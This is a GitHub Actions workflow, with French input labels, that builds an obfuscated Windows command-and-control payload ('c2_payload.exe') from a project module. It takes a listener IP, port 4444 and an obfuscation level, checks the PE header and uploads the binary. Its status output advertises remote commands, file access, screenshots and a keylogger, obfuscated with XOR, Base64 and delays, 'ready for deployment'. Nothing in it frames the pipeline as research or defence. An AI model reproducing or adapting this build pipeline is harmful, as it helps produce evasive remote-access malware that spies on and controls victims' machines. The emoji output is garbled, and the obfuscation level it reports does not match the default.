name: Build C2 Windows PE Binary

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:
    inputs:
      obfuscation_level:
        description: 'Niveau obfuscation (1-5)'
        required: false
        default: '5'
      listener_ip:
        description: 'IP Listener'
        required: false
        default: '0.0.0.0'
      listener_port:
        description: 'Port Listener'
        required: false
        default: '4444'

jobs:
  build-windows:
    runs-on: windows-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python 3.11
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install pyinstaller
    
    - name: Build C2 Binary
      run: |
        python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('${{ github.event.inputs.listener_ip || '0.0.0.0' }}', ${{ github.event.inputs.listener_port || 4444 }}, ${{ github.event.inputs.obfuscation_level || 5 }}, 'windows')"
    
    - name: Verify PE binary format
      run: |
        $bytes = [System.IO.File]::ReadAllBytes("dist\c2_payload.exe")
        $magic = "{0:X2}{1:X2}" -f $bytes[0], $bytes[1]
        Write-Host "ğŸ“Š Magic bytes: $magic"
        if ($magic -eq "4D5A") {
          Write-Host "âœ… Valid PE x64 binary!"
          Write-Host "ğŸ‰ C2 payload compiled successfully!"
        } else {
          Write-Host "âŒ Invalid PE format!"
          exit 1
        }
    
    - name: Display binary info
      run: |
        $file = "dist\c2_payload.exe"
        $size = (Get-Item $file).Length / 1MB
        Write-Host "ğŸ“¦ Binary information:"
        Write-Host "  â”œâ”€ Name: c2_payload.exe"
        Write-Host "  â”œâ”€ Size: $([Math]::Round($size, 2)) MB"
        Write-Host "  â”œâ”€ Format: PE x64 (Windows)"
        Write-Host "  â”œâ”€ Status: âœ… Ready for deployment"
        Write-Host "  â”œâ”€ Features: cmd, files, screenshots, keylogger"
        Write-Host "  â””â”€ Obfuscation: Level 2 (XOR + Base64 + Delays)"
    
    - name: Upload Windows binary
      uses: actions/upload-artifact@v4
      with:
        name: c2-payload-windows
        path: dist/c2_payload.exe
        retention-days: 30
